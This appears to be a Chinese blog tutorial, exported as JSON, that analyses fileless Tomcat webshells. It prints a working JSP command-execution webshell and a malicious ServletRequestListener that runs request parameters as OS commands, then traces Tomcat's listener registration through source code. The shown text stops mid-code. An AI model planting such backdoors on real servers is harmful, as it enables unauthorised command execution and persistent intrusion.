{"title":"Tomcat内存马简析","uid":"a5eb3b6436793531605058c41325d8af","slug":"Tomcat内存马解析","date":"2022-03-26T10:48:45.000Z","updated":"2023-09-29T03:48:35.085Z","comments":true,"path":"api/articles/Tomcat内存马解析.json","keywords":null,"cover":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20221025/images.7i3pppfv9fc.jpg","content":"<h1 id=\"Tomcat内存马简析\"><a href=\"#Tomcat内存马简析\" class=\"headerlink\" title=\"Tomcat内存马简析\"></a>Tomcat内存马简析</h1><p>  webshell木马配合webshell管理工具可以方便对于服务器、内网进行进一步的维权、入侵，随着对文件内容查杀、以Ai对流量特征和行为模式的查杀等等手段，普通文件形式的webshell木马可靠性越来越差。也许好不容易绕过waf传上去两分钟不到就被杀掉了，所以攻击方在近些年也慢慢的研发出“无文件”的webshell木马，即内存马。<br>内存马的概念提出比较久的，但走进视野就近几年的事情，每隔一段时间总能看到不少师傅提出新的内存马实现方法，这里简单说下利用JavaWeb的三大组件Servle、Filter、Listener来动态注册内存马的方式。</p>\n<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><p>  jsp带回显的webshell木马：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>InputStream</span> in <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token number\">2048</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;pre&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">=</span>in<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;/pre&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>request来获得用户请求，当shell字段的get请求存在时，将shell字段的请求信息当作cmd命令去执行，然后执行的结果通过getInputStream()输入流读返回结果，结果读进byte数组中，若有回显，则打印出结果。</p>\n<p>  然而现在的内存马则将重点放在注册恶意组件上，对于Tomcat主要通过JavaWeb的Servlet、Filter、Listener这三大组件来实现。简单说下他们的功能：</p>\n<p>  1、Servlet来处理客户端请求的动态资源，也就说我们用浏览器跳转后，请求由Servlet接受和处理，并完成响应，其中init方法在于接收客户端的第一次请求，service每次请求都会调用，destroy则是销毁用的。</p>\n<p>  2、Filter是拦截器，作用在于拦截请求路径，init在创建Filter对象是调用。doFilter在请求到来，被拦截时执行，destroy就是销毁此对象。</p>\n<p>  3、Listener是事件监听器，作用在于当某事件（比如点击等）在特定事件源发生时执行监听器代码，contextInitialized在Servletcontext创建时调用，contextDestroyed则在Servletcontext销毁时调用。</p>\n<p>  加载的顺序为Listener-&gt;Filter-&gt;Servlet。</p>\n<p>  在基于tomcat编写内存马时经常会遇到它的三个Context，及ServletContext、ApplicationContext、StandardContext，这里简单了解下：</p>\n<p>  首先是Servlet，浏览器发送请求，浏览器接受请求后对请求作出处理，而Tomcat作为一个Servlet容器，将请求传给Servlet，并将相应返回给浏览器，而ServletContext就是servlet要实现的接口，比如路径信息或者拦截信息等。</p>\n<p>  ApplicationContext的功能则在于实现ServletContext规范，一些对应方法的实现，例如addFilter等功能。</p>\n<p>  而在看StandardContext时会发现，ApplicationContext调用的context方法是StandardContext实现的对象，则StandardContext其实是底层与Tomcat底层交互的内容。</p>\n<h2 id=\"Listener内存马\"><a href=\"#Listener内存马\" class=\"headerlink\" title=\"Listener内存马\"></a>Listener内存马</h2><p>  既然加载顺序为Listener-&gt;Filter-&gt;Servlet，那么也根据这个顺序来调试。</p>\n<p>  在注册一个listener时因为要匹配不同的事件，常用的分为ServletContextListener、ServletContextAttributeListener、ServletRequestAttributeListener、HttpSessionListener、ServletRequestListener、HttpSessionAttributeListener，一般常用ServletRequestListener来作内存马，因为他可以监听我们任意访问的资源，在访问资源会触发后其requestInitialized方法。</p>\n<p>  ServletRequestListener的接口有两个事件处理方法：requestInitialized与requestDestroyed， requestInitialized(ServletRequestEvent sre)在与接受对应类型的参数，通过此参数来获得创建的对象；requestDestroyed(ServletRequestEvent sre)则是参数对象销毁时，调用此方法。<br>知道这些就可以创建一个恶意Listener类：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@WebListener</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ListenerShell</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ServletRequestListener</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">requestInitialized</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestEvent</span> sre<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">HttpServletRequest</span> req <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span><span class=\"token punctuation\">)</span> sre<span class=\"token punctuation\">.</span><span class=\"token function\">getServletRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> command <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>command <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">InputStream</span> in <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NullPointerException</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                n<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">requestDestroyed</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestEvent</span> sre<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  其中HttpServletRequest代表浏览器请求，HTTP的所有信息都封装在此对象中，也就是可以从中得到请求信息，后面的就是请求读取请求命令和执行命令了。<br><img src=\"https://cdn.nlark.com/yuque/0/2022/png/21933819/1665752528990-f4d09ce7-f3b7-4a4f-8463-196abb9f5d53.png#clientId=uae6a676b-80ec-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=228&amp;id=uabf7fe43&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=228&amp;originWidth=755&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=16443&amp;status=done&amp;style=none&amp;taskId=ucc3adb6e-817a-4f4a-a19b-e1c2e069e44&amp;title=&amp;width=755\" alt=\"image.png\"><br>访问任意路由即可执行命令。<br>接下来我们进行debug调试，从而知道他如何添加进去的。<br>在我们添加的</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ListenerShell</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ServletRequestListener</span> <span class=\"token punctuation\">{</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>处下断点，查看调用栈：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>init<span class=\"token punctuation\">&gt;</span></span><span class=\"token operator\">:</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ListenerShell</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span></span>Listener</span><span class=\"token punctuation\">)</span>\nnewInstance0<span class=\"token operator\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NativeConstructorAccessorImpl</span> <span class=\"token punctuation\">(</span>sun<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">)</span>\nnewInstance<span class=\"token operator\">:</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NativeConstructorAccessorImpl</span> <span class=\"token punctuation\">(</span>sun<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">)</span>\nnewInstance<span class=\"token operator\">:</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">DelegatingConstructorAccessorImpl</span> <span class=\"token punctuation\">(</span>sun<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">)</span>\nnewInstance<span class=\"token operator\">:</span><span class=\"token number\">423</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constructor</span> <span class=\"token punctuation\">(</span>java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">)</span>\nnewInstance<span class=\"token operator\">:</span><span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">DefaultInstanceManager</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\nlistenerStart<span class=\"token operator\">:</span><span class=\"token number\">4691</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">StandardContext</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>其中listenerStart我们跟进去看下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">listenerStart</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>log<span class=\"token punctuation\">.</span><span class=\"token function\">isDebugEnabled</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        log<span class=\"token punctuation\">.</span><span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Configuring application event listeners\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> listeners <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">findApplicationListeners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> results <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span>listeners<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">boolean</span> ok <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> results<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getLogger</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">isDebugEnabled</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getLogger</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" Configuring event listener class '\"</span> <span class=\"token operator\">+</span> listeners<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">String</span> listener <span class=\"token operator\">=</span> listeners<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            results<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstanceManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>listener<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>其中findApplicationListeners方法就是将我们要注册的Listener传入该方法中，其中这里demo的值为com.Listener.ListenerShell，与写代码的文件目录一致。<br>后面将对象信息传入results里，接下来对于类型进行分类</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lifecycleListener <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ServletContextAttributeListener</span> <span class=\"token operator\">||</span> lifecycleListener <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ServletRequestAttributeListener</span> <span class=\"token operator\">||</span> lifecycleListener <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ServletRequestListener</span> <span class=\"token operator\">||</span> lifecycleListener <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">HttpSessionIdListener</span> <span class=\"token operator\">||</span> lifecycleListener <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">HttpSessionAttributeListener</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    eventListeners<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>lifecycleListener<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>因为这里实现的是ServletRequestListener，所以分到eventListeners数组中<br>然后调用了getApplicationEventListeners</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">eventListeners<span class=\"token punctuation\">.</span><span class=\"token function\">addAll</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">asList</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getApplicationEventListeners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">setApplicationEventListeners</span><span class=\"token punctuation\">(</span>eventListeners<span class=\"token punctuation\">.</span><span class=\"token function\">toArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">getApplicationEventListeners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>applicationEventListenersList<span class=\"token punctuation\">.</span><span class=\"token function\">toArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>其中返回的applicationEventListenersList，为已经注册的Listener，</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setApplicationEventListeners</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> listeners<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>applicationEventListenersList<span class=\"token punctuation\">.</span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>listeners <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> listeners<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>applicationEventListenersList<span class=\"token punctuation\">.</span><span class=\"token function\">addAll</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">asList</span><span class=\"token punctuation\">(</span>listeners<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>setApplicationEventListeners主要完成applicationEventListenersList清空和重新赋值的操作<br>，我们注册的Listener就存储在此。<br>接下来我们去考虑Listener是如何触发的，此时我们在</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">requestInitialized</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestEvent</span> sre<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>下断点进行调试，并用浏览器访问路由，打开debug，在调用栈中看到</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">requestInitialized<span class=\"token operator\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ListenerShell</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span></span>Listener</span><span class=\"token punctuation\">)</span>\nfireRequestInitEvent<span class=\"token operator\">:</span><span class=\"token number\">5992</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">StandardContext</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\ninvoke<span class=\"token operator\">:</span><span class=\"token number\">121</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">StandardHostValve</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>进入fireRequestInitEvent中：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">fireRequestInitEvent</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequest</span> request<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> instances <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getApplicationEventListeners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>instances <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> instances<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">ServletRequestEvent</span> event <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServletRequestEvent</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getServletContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> var4 <span class=\"token operator\">=</span> instances<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> var5 <span class=\"token operator\">=</span> instances<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> var6 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> var6 <span class=\"token operator\">&lt;</span> var5<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>var6<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">Object</span> instance <span class=\"token operator\">=</span> var4<span class=\"token punctuation\">[</span>var6<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>instance <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> instance <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ServletRequestListener</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">ServletRequestListener</span> listener <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestListener</span><span class=\"token punctuation\">)</span>instance<span class=\"token punctuation\">;</span>\n\n                <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                    listener<span class=\"token punctuation\">.</span><span class=\"token function\">requestInitialized</span><span class=\"token punctuation\">(</span>event<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Throwable</span> var10<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token class-name\">ExceptionUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">handleThrowable</span><span class=\"token punctuation\">(</span>var10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getLogger</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span>sm<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"standardContext.requestListener.requestInit\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>instance<span class=\"token punctuation\">.</span><span 